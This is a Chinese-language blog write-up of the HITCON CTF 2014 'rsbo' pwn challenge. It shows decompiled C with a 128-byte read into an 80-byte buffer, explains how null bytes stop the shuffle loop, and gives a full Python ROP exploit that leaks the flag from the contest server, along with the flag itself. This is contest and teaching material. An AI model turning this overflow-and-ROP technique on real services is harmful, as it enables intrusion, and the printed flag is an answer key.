---
layout: post
title: HITCON CTF 2014 - rsbo
category: writeup
tags: [pwn]
---

> $ nc 210.61.8.96 51342
> https://github.com/hitcon2014ctf/ctf/raw/master/rsbo-4a707e7d07e87ab97348be36efea28dc
> https://dl.dropbox.com/s/ydsuwrxv7soj0je/rsbo-4a707e7d07e87ab97348be36efea28dc

remote pwn 的題目，程式會將輸入的字串打亂後輸出:
![nc](http://3.bp.blogspot.com/-0N4fxq3ia5w/U_IPrwMMmGI/AAAAAAAAAYY/jV242BHQdxc/s1600/%E8%9E%A2%E5%B9%95%E5%BF%AB%E7%85%A7%2B2014-08-18%2B%E4%B8%8B%E5%8D%8810.37.00.png)

<!--more-->

抓下執行檔分析，內容大概如下:

```c
#include <stdio.h>
#include <stdlib.h>

ssize_t read_80_bytes(void *buf)
{
    return read(0, buf, 128);
}

void init()
{
    char buf[16];      // [sp+14h] [bp-24h]@1
    int fd;            // [sp+24h] [bp-14h]@1
    unsigned int seed; // [sp+28h] [bp-10h]@1
    int i;             // [sp+2Ch] [bp-Ch]@1

    fd = open("/home/rsbo/flag", 0);
    read(fd, buf, 16);
    seed = time(NULL);
    for ( i = 0; i < 16; ++i )
        seed = (1337 * seed + buf[i]) % 0x7FFFFFFF;
    close(fd);
    memset(buf, 0, 16);
    srand(seed);
}

int main()
{
    int _rand;       // eax@2
    char buffer[80]; // [sp+10h] [bp-60h]@1
    int tmp;         // [sp+60h] [bp-10h]@2
    int j;           // [sp+64h] [bp-Ch]@2
    size_t len;      // [sp+68h] [bp-8h]@1
    size_t i;        // [sp+6Ch] [bp-4h]@1

    alarm(30);
    init();
    len = read_80_bytes(buffer);
    for ( i = 0; i < len; ++i )
    {
      j = rand() % (i + 1);
      tmp = buffer[i];
      buffer[i] = buffer[j];
      buffer[j] = tmp;
    }
    write(1, buffer, len);
    return 0;
}
```

當輸入大於 80 個 char 時會發生 buffer overflow
但由於中間的迴圈會打亂輸入的內容，
因此沒辦法直接將 main() 的 return address 覆蓋為我們想要的 address

後來想到的解法是
塞108個 NULL 字元 + return address

這樣當迴圈中在做第 89 個字元的交換時，就可以把區域變數 len 蓋成 0，
藉此跳出迴圈，我們所指定的 return address 就不會被修改

接著就可以開始寫 rop payload
但有個問題，程式只會讀取128 bytes，扣掉要讓程式 buffer overflow 的108 bytes
我們的 payload 長度只能小於等於 20 bytes，


最後我用了一個有點懶人的解決方式，
先寫一小段 rop，執行完畢後讓 main() return 到程式的入口點，
再執行一次 main() 的內容，程式就會再讀取 80 bytes
此時我們就可以再送一次 payload，又再執行一小段 rop ，然後再回到程式入口點

我們的目的是
open flag -> read -> write

所以只需要執行三小段的 rop 就可以達到目的:

```py
#!/usr/bin/python
from struct import pack
import socket

open_addr = 0x08048420
write_addr = 0x08048450
read_addr = 0x080483E0
flag_path = 0x080487D0
start_addr = 0x08048490
bss_addr = 0x0804A040

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("210.61.8.96", 51342))

# open("/home/rsbo/flag", 0)
payload = ""
payload += "\x00" * 108
payload += pack("<I", open_addr)
payload += pack("<I", start_addr)
payload += pack("<I", flag_path)
payload += pack("<I", 0)
s.send(payload)

# read(3, bss_addr, 60)
payload = ""
payload += "\x00" * 108
payload += pack("<I", read_addr)
payload += pack("<I", start_addr)
payload += pack("<I", 3)            # fd
payload += pack("<I", bss_addr)     # buf
payload += pack("<I", 60)           # len
s.send(payload)

# write(1, bss_addr, 60)
payload = ""
payload += "\x00" * 108
payload += pack("<I", write_addr)
payload += pack("<I", start_addr)
payload += pack("<I", 1)            # fd
payload += pack("<I", bss_addr)     # buf
payload += pack("<I", 60)           # len
s.send(payload)

print s.recv(1024)
```

Flag: `HITCON{Y0ur rand0m pay1oad s33ms w0rk, 1uckv 9uy}`


